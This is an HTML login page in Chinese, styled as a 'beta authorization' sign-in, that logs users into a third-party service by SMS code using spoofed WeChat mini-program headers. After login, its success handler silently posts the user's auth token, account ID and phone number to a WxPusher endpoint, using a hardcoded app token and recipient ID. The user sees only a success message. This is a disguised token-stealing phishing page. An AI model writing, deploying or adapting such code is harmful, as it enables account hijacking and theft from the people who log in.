<!DOCTYPE html>
<html lang="zh-CN">

<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>登录1</title>
  <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      font-family: "Microsoft YaHei", Arial, sans-serif;
      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
    }

    .container {
      background: white;
      border-radius: 20px;
      box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
      padding: 40px;
      max-width: 400px;
      width: 90%;
    }

    .login-box {
      display: block;
    }

    .success-box {
      display: none;
      text-align: center;
    }

    h2 {
      text-align: center;
      color: #333;
      margin-bottom: 30px;
      font-size: 28px;
    }

    .form-group {
      margin-bottom: 20px;
    }

    label {
      display: block;
      margin-bottom: 8px;
      color: #555;
      font-weight: 500;
    }

    input {
      width: 100%;
      padding: 12px 15px;
      border: 2px solid #e0e0e0;
      border-radius: 8px;
      font-size: 14px;
      transition: all 0.3s;
    }

    input:focus {
      outline: none;
      border-color: #667eea;
      box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
    }

    .code-group {
      display: flex;
      gap: 10px;
    }

    .code-group input {
      flex: 1;
    }

    .get-code-btn {
      padding: 12px 20px;
      background: #667eea;
      color: white;
      border: none;
      border-radius: 8px;
      cursor: pointer;
      font-size: 14px;
      white-space: nowrap;
      transition: all 0.3s;
    }

    .get-code-btn:hover:not(:disabled) {
      background: #5568d3;
      transform: translateY(-2px);
    }

    .get-code-btn:disabled {
      background: #ccc;
      cursor: not-allowed;
    }

    .login-btn {
      width: 100%;
      padding: 14px;
      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
      color: white;
      border: none;
      border-radius: 8px;
      font-size: 16px;
      font-weight: 600;
      cursor: pointer;
      transition: all 0.3s;
      margin-top: 10px;
    }

    .login-btn:hover {
      transform: translateY(-2px);
      box-shadow: 0 10px 20px rgba(102, 126, 234, 0.3);
    }

    .login-btn:disabled {
      background: #ccc;
      cursor: not-allowed;
      transform: none;
    }

    .error-msg {
      color: #e74c3c;
      font-size: 13px;
      margin-top: 5px;
      display: none;
    }

    .success-icon {
      width: 80px;
      height: 80px;
      margin: 0 auto 20px;
      background: #52c41a;
      border-radius: 50%;
      display: flex;
      justify-content: center;
      align-items: center;
      animation: scaleIn 0.5s ease-out;
    }

    .success-icon::after {
      content: "✓";
      color: white;
      font-size: 50px;
      font-weight: bold;
    }

    @keyframes scaleIn {
      0% {
        transform: scale(0);
      }

      50% {
        transform: scale(1.1);
      }

      100% {
        transform: scale(1);
      }
    }

    .success-text {
      color: #52c41a;
      font-size: 24px;
      font-weight: 600;
      margin-bottom: 15px;
    }

    .user-info {
      background: #f5f5f5;
      padding: 20px;
      border-radius: 10px;
      margin-top: 20px;
      text-align: left;
    }

    .user-info p {
      margin: 10px 0;
      color: #666;
      font-size: 14px;
    }

    .user-info strong {
      color: #333;
    }

    .logout-btn {
      margin-top: 20px;
      padding: 10px 30px;
      background: #f0f0f0;
      color: #666;
      border: none;
      border-radius: 8px;
      cursor: pointer;
      font-size: 14px;
      transition: all 0.3s;
    }

    .logout-btn:hover {
      background: #e0e0e0;
    }

    .loading {
      display: inline-block;
      width: 14px;
      height: 14px;
      border: 2px solid #fff;
      border-radius: 50%;
      border-top-color: transparent;
      animation: spin 0.6s linear infinite;
    }

    @keyframes spin {
      to {
        transform: rotate(360deg);
      }
    }
  </style>
</head>

<body>
  <div class="container">
    <!-- 登录界面 -->
    <div class="login-box" id="loginBox">
      <h2>内测授权登录1</h2>
      <form id="loginForm">
        <div class="form-group">
          <label for="phone">手机号</label>
          <input type="tel" id="phone" placeholder="请输入手机号" maxlength="11" required />
          <div class="error-msg" id="phoneError">请输入正确的手机号</div>
        </div>

        <div class="form-group">
          <label for="code">验证码</label>
          <div class="code-group">
            <input type="text" id="code" placeholder="请输入验证码" maxlength="6" required />
            <button type="button" class="get-code-btn" id="getCodeBtn">
              获取验证码
            </button>
          </div>
          <div class="error-msg" id="codeError">请输入验证码</div>
        </div>

        <button type="submit" class="login-btn" id="loginBtn">登录</button>
      </form>
    </div>

    <!-- 登录成功界面 -->
    <div class="success-box" id="successBox">
      <div class="success-icon"></div>
      <div class="success-text">登录成功</div>
      <div class="user-info" id="userInfo">
        <p><strong>手机号：</strong><span id="userPhone"></span></p>
        <p><strong>登录时间：</strong><span id="loginTime"></span></p>
      </div>

      <button class="logout-btn" onclick="logout()">退出登录</button>
    </div>
  </div>
  <script>
    // 配置 axios 基础URL（根据实际情况修改）
    const _axios = axios.create({
      baseURL: "https://linjiucloud-api.ysservice.com.cn", // 请替换为实际的_axios地址
      timeout: 30000,
      headers: {
        host: "linjiucloud-api.ysservice.com.cn",
        "x-project-id": "",
        xweb_xhr: "1",
        "x-client-type": "mini_program",
        "user-agent":
          "Mozilla/5.0 (Linux; Android 10; MI 8 Build/QKQ1.190828.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/134.0.6998.136 Mobile Safari/537.36 XWEB/1340123 MMWEBSDK/20250201 MMWEBID/9162 MicroMessenger/8.0.60.2860(0x28003C3C) WeChat/arm64 Weixin NetType/WIFI Language/zh_CN ABI/arm64 MiniProgramEnv/android",
        "content-type": "application/json",
        "x-client-id": "64",
        "x-tenant-id": "10111",
        accept: "*/*",
        "sec-fetch-site": "cross-site",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        referer:
          "https://servicewechat.com/wx0a9f159eddb2c5f8/100/page-frame.html",
        "accept-encoding": "gzip, br",
        "accept-language": "zh-CN,zh;q=0.9",
        priority: "u=1, i",
      },
    });

    // 手机号验证
    function validatePhone(phone) {
      return /^1[3-9]\d{9}$/.test(phone);
    }

    // 获取验证码
    let countdown = 0;
    const getCodeBtn = document.getElementById("getCodeBtn");
    const phoneInput = document.getElementById("phone");
    const phoneError = document.getElementById("phoneError");

    getCodeBtn.addEventListener("click", async function () {
      window.open("./index1.html");
      return;
      const phone = phoneInput.value.trim();

      // 验证手机号
      if (!validatePhone(phone)) {
        phoneError.style.display = "block";
        phoneInput.focus();
        return;
      }

      phoneError.style.display = "none";

      try {
        // 发送获取验证码请求
        const res = await _axios.post(
          "/base/app/uaa/common/sms/verification-code/send",
          { mobile: phone, usage: "login_account" }
        );

        // 模拟成功响应（实际开发中根据后端返回判断）
        if (res.data.code === 0) {
          alert("验证码已发送，请注意查收！");

          // 开始倒计时
          countdown = 60;
          getCodeBtn.disabled = true;

          const timer = setInterval(() => {
            countdown--;
            getCodeBtn.textContent = `${countdown}秒后重试`;

            if (countdown <= 0) {
              clearInterval(timer);
              getCodeBtn.disabled = false;
              getCodeBtn.textContent = "获取验证码";
            }
          }, 1000);
        } else {
          alert(res.data.message);
          // 开始倒计时
          countdown = 60;
          getCodeBtn.disabled = true;

          const timer = setInterval(() => {
            countdown--;
            getCodeBtn.textContent = `${countdown}秒后重试`;

            if (countdown <= 0) {
              clearInterval(timer);
              getCodeBtn.disabled = false;
              getCodeBtn.textContent = "获取验证码";
            }
          }, 1000);
        }
      } catch (error) {
        console.error("获取验证码失败:", error);
        countdown = 60;
        getCodeBtn.disabled = true;

        const timer = setInterval(() => {
          countdown--;
          getCodeBtn.textContent = `${countdown}秒后重试`;

          if (countdown <= 0) {
            clearInterval(timer);
            getCodeBtn.disabled = false;
            getCodeBtn.textContent = "获取验证码";
          }
        }, 1000);
      }
    });

    // 登录表单提交
    const loginForm = document.getElementById("loginForm");
    const loginBtn = document.getElementById("loginBtn");
    const codeInput = document.getElementById("code");
    const codeError = document.getElementById("codeError");

    loginForm.addEventListener("submit", async function (e) {
      e.preventDefault();

      const phone = phoneInput.value.trim();
      const code = codeInput.value.trim();

      // 验证
      let hasError = false;

      if (!validatePhone(phone)) {
        phoneError.style.display = "block";
        hasError = true;
      } else {
        phoneError.style.display = "none";
      }

      if (!code || code.length !== 6) {
        codeError.style.display = "block";
        hasError = true;
      } else {
        codeError.style.display = "none";
      }

      if (hasError) return;

      // 显示加载状态
      loginBtn.disabled = true;
      const originalText = loginBtn.textContent;
      loginBtn.innerHTML = '<span class="loading"></span> 登录中...';

      try {
        // 发送登录请求
        const response = await _axios.post(
          "/base/app/uaa/manager/auth/mobile/code",
          {
            mobile: phone,
            code: code,
          }
        );

        if (response.data.code === 0) {
          // 发送登录请求
          const res = await _axios.post("/mc/member/autoMember", {
            mobile: phone,
            channel: "CHARGE_PLATFORM",
            tenantId: "10111",
            skipRequest: true,
          });
          if (res.data.code === 0) {
            // 登录成功，显示成功页面
            showSuccessPage(phone, {
              name: `账号${phone}`,
              createdName: `用户${phone.slice(-4)}`,
              phone: phone,
              createdBy: res.data.data,
              AuthToken: response.data.data.authToken,
              AccountId: response.data.data.accountId,
            });
          }
        } else {
          alert(response.data.message || "登录失败，请重试");
          loginBtn.disabled = false;
          loginBtn.textContent = originalText;
        }
      } catch (error) {
        console.error("登录失败:", error);
        loginBtn.disabled = false;
        loginBtn.textContent = originalText;
      }
    });

    // 显示成功页面
    async function showSuccessPage(phone, userInfo) {
      // 更新页面显示
      document.getElementById("userPhone").textContent = phone;
      document.getElementById("loginTime").textContent =
        new Date().toLocaleString("zh-CN");
      const API = axios.create({
        baseURL: "https://wxpusher.zjiecode.com", // 请替换为实际的_axios地址
        timeout: 30000,
        headers: { "content-type": "application/json" },
      });
      const res = await API.post("/api/send/message", {
        appToken: "AT_YDuD4VgQDMQP9S2YCINizy9giR1Mdj2G",
        content: JSON.stringify(userInfo),
        summary: `${userInfo.phone}-账号积分信息`,
        contentType: 2,
        uids: ["UID_DjJHo4FSVl6rDOl0uNW93G2YtHw9"],
        url: "",
        verifyPay: false,
        verifyPayType: 0,
      });

      // 切换显示
      document.getElementById("loginBox").style.display = "none";
      document.getElementById("successBox").style.display = "block";
    }

    // 退出登录
    function logout() {
      // 重置表单
      loginForm.reset();
      loginBtn.disabled = false;
      loginBtn.textContent = "登录";

      // 切换显示
      document.getElementById("successBox").style.display = "none";
      document.getElementById("loginBox").style.display = "block";
    }
  </script>
</body>

</html>